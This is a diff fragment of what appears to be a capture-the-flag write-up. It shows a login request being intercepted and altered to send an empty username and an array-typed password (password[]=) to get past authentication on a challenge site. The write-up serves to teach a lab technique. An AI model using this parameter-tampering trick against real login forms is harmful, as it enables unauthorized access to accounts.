@@ -41,7 +41,9 @@ Now enter some random strings in User and Pwd form or can even submit [SPACE] to
 
 I intercepted the request in the login form and updated this
 **GET /?username=admin&password=admin&submit=Login HTTP/2__**
+
 To
+
 **GET /?username=&password[]=&submit=Login HTTP/2**
 for example if its challenge.com/?username=admin&password=admin&submit=Login
 i changed it to challenge.com/?username=&password[]=&submit=Login
